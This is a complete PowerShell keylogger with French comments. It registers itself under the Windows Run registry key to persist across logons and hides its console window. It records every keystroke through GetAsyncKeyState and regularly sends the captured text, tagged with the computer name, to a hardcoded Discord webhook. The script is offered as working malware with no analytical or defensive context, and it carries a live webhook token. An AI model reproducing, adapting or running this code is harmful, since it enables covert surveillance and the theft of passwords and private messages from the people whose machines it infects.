# Définir automatiquement le chemin du script dans le dossier Documents
$scriptPath = "$env:USERPROFILE\Documents\script.ps1"

# Ajouter le script au registre pour exécution au démarrage
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "MyStartupScript" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File $scriptPath"

# URL du webhook Discord
$dc = "https://discord.com/api/webhooks/1333181685000442000/m2DkAjyoscuYxvQEtWy4nEBhWQRjLwP6RxrJevz4gigLcVfH4nieIoEZKN6_tyWfcWDA"

# Masquer la fenêtre PowerShell
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if ($hwnd -ne [System.IntPtr]::Zero) {
    $Type::ShowWindowAsync($hwnd, 0)
} else {
    $Host.UI.RawUI.WindowTitle = 'hideme'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

# Importer les définitions DLL pour capturer les touches du clavier
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

# Définir un chronomètre pour l'envoi intelligent
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

# Boucle continue pour capturer les touches
While ($true) {
    $keyPressed = $false
    try {
        # Vérifier les activités du clavier
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            Start-Sleep -Milliseconds 30
            for ($asc = 8; $asc -le 254; $asc++) {
                $keyst = $API::GetAsyncKeyState($asc)
                if ($keyst -eq -32767) {
                    $keyPressed = $true
                    $LastKeypressTime.Restart()
                    $null = [console]::CapsLock
                    $vtkey = $API::MapVirtualKey($asc, 3)
                    $kbst = New-Object Byte[] 256
                    $checkkbst = $API::GetKeyboardState($kbst)
                    $logchar = New-Object -TypeName System.Text.StringBuilder
                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                        $LString = $logchar.ToString()
                        if ($asc -eq 8) { $LString = "[BKSP]" }
                        if ($asc -eq 13) { $LString = "[ENT]" }
                        if ($asc -eq 27) { $LString = "[ESC]" }
                        $send += $LString
                    }
                }
            }
        }
    } finally {
        If ($keyPressed) {
            # Envoyer les données capturées au webhook
            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
            $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ; "content" = $escmsg} | ConvertTo-Json
            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
            $send = ""
            $keyPressed = $false
        }
    }
    # Réinitialiser le chronomètre avant de relancer la boucle
    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}
